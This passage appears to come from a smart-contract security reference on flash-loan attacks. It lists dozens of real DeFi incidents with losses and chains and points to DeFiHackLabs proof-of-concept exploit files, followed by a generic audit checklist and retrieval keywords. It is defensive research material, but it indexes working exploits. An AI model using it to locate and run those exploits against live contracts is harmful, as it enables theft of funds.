- **BeanstalkFarms** (2022-04, $182.0M, ethereum) | PoC: `DeFiHackLabs/src/test/2022-04/Beanstalk_exp.sol`
- **NewFreeDAO** (2022-09, $125.0M, bsc) | PoC: `DeFiHackLabs/src/test/2022-09/NewFreeDAO_exp.sol`
- **Rari Capital/Fei Protocol** (2022-04, $80.0M, ethereum) | PoC: `DeFiHackLabs/src/test/2022-04/Rari_exp.sol`
- *... and 31 more exploits*

#### Flash-Loan/Flash Mint (1 exploits, $29K)

- **Vista** (2024-10, $29K, bsc) | PoC: `DeFiHackLabs/src/test/2024-10/VISTA_exp.sol`

#### Flash-Loan/Callback Validation (2 exploits, $4K)

- **AnnexFinance** (2022-11, $3K, bsc) | PoC: `DeFiHackLabs/src/test/2022-11/Annex_exp.sol`
- **EFLeverVault** (2022-10, $750, ethereum) | PoC: `DeFiHackLabs/src/test/2022-10/EFLeverVault_exp.sol`

### Complete DeFiHackLabs Exploit Table

| Protocol | Date | Loss | Vulnerability Sub-type | Chain |
|----------|------|------|----------------------|-------|
| BeanstalkFarms | 2022-04-16 | $182.0M | DAO + Flashloan | ethereum |
| NewFreeDAO | 2022-09-08 | $125.0M | Flashloans Attack | bsc |
| Rari Capital/Fei Protocol | 2022-04-30 | $80.0M | Flashloan Attack + Reentrancy | ethereum |
| Harvest Finance | 2020-10-26 | $33.8M | Flashloan Attack | ethereum |
| Grim Finance | 2021-12-18 | $30.0M | Flashloan & Reentrancy | fantom |
| Cream Finance | 2021-08-30 | $18.0M | Flashloan Attack + Reentrancy | ethereum |
| DEUS DAO | 2022-04-28 | $13.0M | Flashloan & Price Oracle Manipulation | fantom |
| ElephantMoney | 2022-04-12 | $11.2M | Flashloan & Price Oracle Manipulation | bsc |
| PolterFinance | 2024-11-19 | $7.0M | FlashLoan Attack | fantom |
| XSURGE | 2021-08-17 | $5.0M | Flashloan Attack + Reentrancy | bsc |
| Paraluni | 2022-03-13 | $1.7M | Flashloan & Reentrancy | bsc |
| JulSwap | 2021-05-27 | $1.5M | Flash Loan | bsc |
| OneRing Finance | 2022-03-21 | $1.4M | Flashloan & Price Oracle Manipulation | fantom |
| ApeCoin (APE) | 2022-05-17 | $1.1M | Flashloan | ethereum |
| CompoundFork | 2024-10-26 | $1.0M | Flashloan attack | base |
| DODO | 2021-03-08 | $700K | Flashloan Attack | ethereum |
| Ploutoz | 2021-11-23 | $365K | Flash Loan | bsc |
| DDCoin | 2023-06-01 | $300K | Flashloan attack and smart contract vulnerability | bsc |
| OverNight | 2022-12-02 | $170K | FlashLoan Attack | None |
| MooCAKECTX | 2022-11-07 | $140K | FlashLoan Attack | bsc |
| ZoomproFinance | 2022-09-05 | $61K | Flashloans & Price Manipulation | bsc |
| BXH | 2022-09-28 | $40K | Flashloan & Price Oracle Manipulation | bsc |
| EGD Finance | 2022-08-07 | $36K | Flashloans & Price Manipulation | bsc |
| Vista | 2024-10-22 | $29K | flashmint receive error | bsc |
| SpaceGodzilla | 2022-07-13 | $25K | Flashloans & Price Manipulation | bsc |
| UEarnPool | 2022-11-17 | $24K | FlashLoan Attack | bsc |
| APC | 2022-12-01 | $6K | FlashLoan & price manipulation | bsc |
| AnnexFinance | 2022-11-19 | $3K | Verify flashLoan Callback | bsc |
| ParaSpace NFT | 2023-03-17 | $3K | Flashloan + scaledBalanceOf Manipulation | ethereum |
| DFS | 2022-12-30 | $1K | Insufficient validation + flashloan | bsc |
| GYMNetwork | 2022-04-09 | $1K | Flashloan + token migrate flaw | bsc |
| EFLeverVault | 2022-10-14 | $750 | Verify flashLoan Callback | ethereum |
| NOVO Protocol | 2022-05-29 | $279 | Flashloan & Price Oracle Manipulation | bsc |
| Wiener DOGE | 2022-04-24 | $78 | Flashloan | bsc |
| InverseFinance | 2022-06-16 | $53 | Flashloan & Price Oracle Manipulation | ethereum |
| Discover | 2022-06-06 | $49 | Flashloan & Price Oracle Manipulation | bsc |
| OMPx Contract | 2024-08-16 | $4 | FlashLoan | ethereum |

### Top PoC References

- **BeanstalkFarms** (2022-04, $182.0M): `DeFiHackLabs/src/test/2022-04/Beanstalk_exp.sol`
- **NewFreeDAO** (2022-09, $125.0M): `DeFiHackLabs/src/test/2022-09/NewFreeDAO_exp.sol`
- **Rari Capital/Fei Protocol** (2022-04, $80.0M): `DeFiHackLabs/src/test/2022-04/Rari_exp.sol`
- **Harvest Finance** (2020-10, $33.8M): `DeFiHackLabs/src/test/2020-10/HarvestFinance_exp.sol`
- **Grim Finance** (2021-12, $30.0M): `DeFiHackLabs/src/test/2021-12/Grim_exp.sol`
- **Cream Finance** (2021-08, $18.0M): `DeFiHackLabs/src/test/2021-08/Cream_exp.sol`
- **DEUS DAO** (2022-04, $13.0M): `DeFiHackLabs/src/test/2022-04/deus_exp.sol`
- **ElephantMoney** (2022-04, $11.2M): `DeFiHackLabs/src/test/2022-04/Elephant_Money_exp.sol`
- **PolterFinance** (2024-11, $7.0M): `DeFiHackLabs/src/test/2024-11/PolterFinance_exploit.sol`
- **XSURGE** (2021-08, $5.0M): `DeFiHackLabs/src/test/2021-08/XSURGE_exp.sol`

### Detection Patterns

#### Code Patterns to Look For
```
- See vulnerable pattern examples above for specific code smells
- Check for missing validation on critical state-changing operations
- Look for assumptions about external component behavior
```

#### Audit Checklist
- [ ] Verify all state-changing functions have appropriate access controls
- [ ] Check for CEI pattern compliance on external calls
- [ ] Validate arithmetic operations for overflow/underflow/precision loss
- [ ] Confirm oracle data freshness and sanity checks

### Keywords for Search

> These keywords enhance vector search retrieval:

`Aave_flash`, `Balancer_flash`, `DODO_DVM`, `DVMFlashLoanCall`, `DeFiHackLabs`, `ERC3156`, `Reinitialization`, `Uniswap_flash`, `addLiquidity`, `approve`, `attack`, `balanceOf`, `block.number`, `block.timestamp`, `borrow`, `burn`, `callback_function`, `claimTokens`, `collateral_valuation`, `defi`, `deposit`, `depositByAddLiquidity`, `dex`, `donation_attack`, `economic`, `flash_loan`, `flash_loan_attack`, `flash_loan_callback`, `flash_mint`, `governance`, `governance_voting`, `initiator_validation`, `lending`, `real_exploit`, `reentrancy_guard`, `repayment_check`, `self_liquidation`, `state_update_ordering`, `vault`
